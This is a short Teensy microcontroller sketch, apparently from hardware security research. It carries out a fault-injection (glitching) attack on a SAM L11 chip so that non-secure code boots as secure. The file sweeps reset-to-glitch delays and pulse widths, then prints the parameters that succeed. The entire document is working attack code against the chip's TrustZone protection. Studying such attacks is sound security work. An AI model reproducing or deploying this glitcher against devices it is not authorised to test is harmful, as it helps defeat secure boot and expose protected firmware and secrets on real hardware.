//Fault injection to boot nonsecure code as secure on SAM L11
//Athor: Marek Lörinc
//Date: 08.05.2022

//Pin used on teensy (D11, D10, D9)
#define PIN_GLITCH      11
#define PIN_READ        10
#define PIN_RESET       9

//Delay after reset before fault is injected in nanoseconds
#define DELAY_START     2180000
#define DELAY_STOP      2189000

//Width of glitch pulse
#define GLITCH_WIDTH_MIN 100
#define GLITCH_WIDTH_MAX 121

void setup() {
  // Set direction of pin and default state
  pinMode(PIN_GLITCH, OUTPUT);
  pinMode(PIN_RESET, OUTPUT);
  pinMode(PIN_READ, INPUT);
  digitalWriteFast(PIN_GLITCH, HIGH);
  digitalWriteFast(PIN_RESET, HIGH);
  // Baudrate of serial port
  Serial.begin(115200);
}

bool end = false;
void loop() {
  delay(500);
  int gl_width = 0;
  int pre_delay = 0;
  if(!digitalRead(PIN_READ)){   //If glitch is successfull, stop glitching
    for(unsigned int i = DELAY_START; i < DELAY_STOP; i+=50){
      for(unsigned int j = GLITCH_WIDTH_MIN; j < GLITCH_WIDTH_MAX; j++){
        //Reset SAM L11
        digitalWriteFast(PIN_RESET, LOW);
        delay(40);
        digitalWriteFast(PIN_RESET, HIGH);
        //Wait i nanoseconds before glitch
        delayNanoseconds(i);
        //Send glitch
        digitalWriteFast(PIN_GLITCH, LOW);
        delayNanoseconds(j);
        digitalWriteFast(PIN_GLITCH, HIGH);
        delay(15);
        //If glitch is successful, print its parameters to serial port
        if (digitalRead(PIN_READ)) {
          Serial.print("Glitch width: ");
          Serial.println(j);
          Serial.print("Pre delay: ");
          Serial.println(i);
          end = true;   
          break;
        }
      }
      if(end){
        break;
      }
    }
  }
}
